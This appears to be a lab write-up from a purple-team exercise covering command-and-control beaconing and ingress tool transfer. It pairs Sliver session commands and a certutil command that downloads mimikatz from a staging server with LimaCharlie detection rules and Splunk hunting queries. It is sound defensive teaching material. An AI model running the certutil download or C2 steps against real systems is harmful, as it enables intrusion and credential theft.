# Phase 5: Command and Control — Persistence & Ingress Tool Transfer

---

## Overview

### Objective

Establish a stable, high-integrity command-and-control (C2) channel between the compromised host and attacker infrastructure. This phase demonstrates how persistence-enabled beaconing is leveraged to maintain access and how native Windows binaries are abused to stage additional post-exploitation tooling.

Credential theft in the previous phase transitions into sustained attacker presence and operational expansion.

---

### MITRE ATT&CK Mapping

- **Tactic:** TA0011 – Command and Control  
- **T1071.001:** Application Layer Protocol: Web Protocols  
- **T1105:** Ingress Tool Transfer  

---

### Strategy

Two coordinated techniques are demonstrated:

1. **5(a) Automated C2 Heartbeat**  
   Persistent SYSTEM-level beaconing from a hijacked service binary

2. **5(b) Native Binary Tool Ingress**  
   Abuse of `certutil.exe` to stage post-exploitation tools

---

# 🚩 5(a) — C2 Heartbeat (Traffic Beaconing)

---

## Analyst Context

The malicious service binary **Common.exe**, planted during the privilege escalation phase, now runs as a SYSTEM-level service. It maintains an HTTP long-polling beacon that periodically checks in with attacker infrastructure.

This creates a predictable, mechanical traffic pattern in network telemetry — a hallmark of automated C2 communication.

---

## Attack Simulation (Red Team)

### Step 1: Session Interaction & Integrity Verification

The attacker interacts with the existing session to confirm SYSTEM-level privileges gained from the service hijack.

**Command (Sliver)**

```bash
sliver (commonsvcs) > info
sliver (commonsvcs) > shell
C:\Windows\system32> whoami /priv
```

📌 Screenshot Note:  
Insert screenshot of Sliver session info confirming SYSTEM context  
Insert screenshot of `whoami /priv` output showing elevated privileges

---

## Endpoint Detection (Blue Team — LimaCharlie)

### Detection Trigger

The endpoint detects an unsigned or non-standard service binary maintaining a persistent outbound connection.

### Detection Rule Logic

```yaml
# Detects Common.exe initiating outbound network activity
op: and
rules:
 - op: ends with
   path: event/FILE_PATH
   value: Common.exe
 - op: exists
   path: event/NETWORK_ACTIVITY/DESTINATION_IP
```

📌 Screenshot Note:  
Insert LimaCharlie network telemetry showing Common.exe ESTABLISHED connection

---

### Assessment

Continuous outbound communication from a manually placed binary running under SYSTEM integrity is highly suspicious and strongly indicative of active C2 beaconing.

---

## Detection & Hunting (Blue Team — Splunk)

### Detection Logic

Visualize automated beacon frequency to identify machine-like communication behavior.

**Query**

```spl
index=windows EventCode=3 Image="*\\Common.exe"
| bin _time span=1m
| stats count by _time, Image, DestIp, DestinationPort
| timechart span=1m count by Image
```

📌 Screenshot Note:  
Insert Splunk timechart showing consistent beaconing pattern  
Insert Splunk stats table of outbound connections

---

### Analyst Assessment

- **Observation:** Common.exe initiates outbound HTTP connections ~10–12 times per minute  
- **Anomaly:** Traffic pattern is perfectly uniform, unlike legitimate application bursts  
- **Conclusion:** Programmed beacon heartbeat confirmed

---

# 🚩 5(b) — Ingress Tool Transfer (Certutil Abuse)

---

## Analyst Context

Attackers frequently abuse signed native Windows utilities to download malicious tools. This Living-Off-The-Land technique reduces detection risk by blending into legitimate system behavior.

---

## Attack Simulation (Red Team)

### Step 2: External Tool Retrieval

The attacker uses `certutil.exe` to download a credential harvesting tool from an external staging server.

**Command**

```cmd
certutil -urlcache -split -f http://192.168.1.101:8001/mimikatz/x64/mimikatz.exe C:\Users\Public\mimikatz.exe
```

📌 Screenshot Note:  
Insert staging server console showing HTTP GET request  
Insert Sliver shell confirming successful download

---

## Endpoint Detection (Blue Team — LimaCharlie)

### Detection Trigger

Certutil executing with network download arguments.

### Detection Rule Logic

```yaml
# Detects certutil used for ingress tool transfer
op: and
rules:
 - op: ends with
   path: event/FILE_PATH
   value: certutil.exe
 - op: contains
   path: event/COMMAND_LINE
   value: "urlcache"
```

📌 Screenshot Note:  
Insert LimaCharlie alert console screenshot  
Insert timeline showing process tree:  
services.exe → Common.exe → certutil.exe

---

### Assessment

Certutil being used to download executables is a high-confidence IOC. This behavior is not consistent with normal certificate management operations.

---

## Detection & Hunting (Blue Team — Splunk)

### Detection Logic

Identify misuse of certutil to retrieve external payloads.

**Query**

```spl
index=windows EventCode=1 Image="*\\certutil.exe" 
CommandLine="*urlcache*" AND CommandLine="*http*"
| table _time, ComputerName, User, CommandLine, ParentImage
```

📌 Screenshot Note:  
Insert Splunk results showing certutil execution  
Insert parent-child relationship linking to Common.exe

---

### Analyst Assessment

- **Observation:** Certutil downloaded executable content from attacker server  
- **Context:** Spawned by malicious SYSTEM service binary  
- **Confidence:** 100% confirmed ingress tool transfer

---

## SOC Decision & Response

**Status:** CONFIRMED ACTIVE C2 CHANNEL (SYSTEM INTEGRITY)

### Immediate Actions

- Isolate host using network segregation  
- Terminate Common.exe and child processes  
- Delete staged tools from `C:\Users\Public\`  
- Preserve forensic evidence for incident response

---

## Key Takeaway

The attacker transitioned from privilege escalation into sustained command-and-control operations by:

- Maintaining SYSTEM-level automated beaconing  
- Leveraging native binaries for stealth tool delivery  

Persistence plus living-off-the-land techniques enable long-term attacker presence while minimizing detection surface.
